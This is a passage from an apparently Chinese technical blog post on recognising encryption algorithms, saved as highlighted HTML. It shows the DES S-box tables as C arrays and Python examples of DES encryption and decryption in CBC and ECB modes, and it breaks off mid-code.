number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">int</span> S2<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>             <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>             <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>            <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">int</span> S3<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>            <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>             <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">int</span> S4<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>            <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>            <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>             <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">int</span> S5<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>            <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>             <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>            <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">int</span> S6<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>            <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>             <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>             <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">int</span> S7<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>             <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>             <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">int</span> S8<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>             <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>             <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>             <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%8111.png" alt="加密算法的函数特征11.png"></p><hr><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%8110.png" alt="加密算法的函数特征10.png"></p><hr><h2 id="加解密代码-5"><a href="#加解密代码-5" class="headerlink" title="加解密代码"></a>加解密代码</h2><h3 id="Python-版（CBC-模式）"><a href="#Python-版（CBC-模式）" class="headerlink" title="Python 版（CBC 模式）"></a>Python 版（CBC 模式）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pyDes <span class="token keyword">import</span> des<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> PAD_PKCS5  <span class="token keyword">import</span> binascii    key <span class="token operator">=</span> <span class="token string">'hi_uf4te'</span>  <span class="token comment"># 秘钥, 8 位  </span>iv <span class="token operator">=</span> <span class="token string">'uf4te!!!'</span>  <span class="token comment"># 偏移量 iv, 8 位  </span>    <span class="token keyword">def</span> <span class="token function">des_encrypt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># key : 加密密钥, CBC : 加密模式，iv : 偏移, padmode : 填充  </span>    des_obj <span class="token operator">=</span> des<span class="token punctuation">(</span>key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>      <span class="token comment"># 返回为字节  </span>    secret_bytes <span class="token operator">=</span> des_obj<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>s<span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>      <span class="token comment"># 将字节对象转换为十六进制字符串  </span>    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>secret_bytes<span class="token punctuation">)</span>      <span class="token keyword">def</span> <span class="token function">des_descrypt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># key : 加密密钥, CBC : 加密模式，iv : 偏移, padmode : 填充  </span>    des_obj <span class="token operator">=</span> des<span class="token punctuation">(</span>key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>      decrypt_str <span class="token operator">=</span> des_obj<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>      <span class="token keyword">return</span> decrypt_str      text <span class="token operator">=</span> <span class="token string">b'welcome_to_uf4te'</span>  <span class="token comment"># 加解密内容  </span>  enc <span class="token operator">=</span> des_encrypt<span class="token punctuation">(</span>text<span class="token punctuation">)</span>  <span class="token comment"># DES 加密，结果为 16 进制字节流  </span><span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span>    dec <span class="token operator">=</span> des_descrypt<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>  <span class="token comment"># DES 解密  </span><span class="token keyword">print</span><span class="token punctuation">(</span>dec<span class="token punctuation">)</span><span class="token triple-quoted-string string">''' 输出：b'54576e252cc9973824e53ea43eb28489b3bb662a97e07165'b'welcome_to_uf4te''''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Python-版（ECB-模式）"><a href="#Python-版（ECB-模式）" class="headerlink" title="Python 版（ECB 模式）"></a>Python 版（ECB 模式）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> DES<span class="token keyword">import</span> binasciikey <span class="token operator">=</span> <span class="token string">b'hi_uf4te'</span>  <span class="token comment"># 密钥 8 位或 16 位,必须为 bytes 类型</span>text <span class="token operator">=</span> <span class="token string">'welcome_to_uf4te'</span><span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 如果 text 不是 8 的倍数【加密文本 text 必须为 8 的倍数！】，补足为 8 的倍数</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        text <span class="token operator">+=</span> <span class="token string">' '</span>    <span class="token keyword">return</span> textdes <span class="token operator">=</span> DES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> DES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>  <span class="token comment"># 创建 DES 实例</span>padded_text <span class="token operator">=</span> pad<span 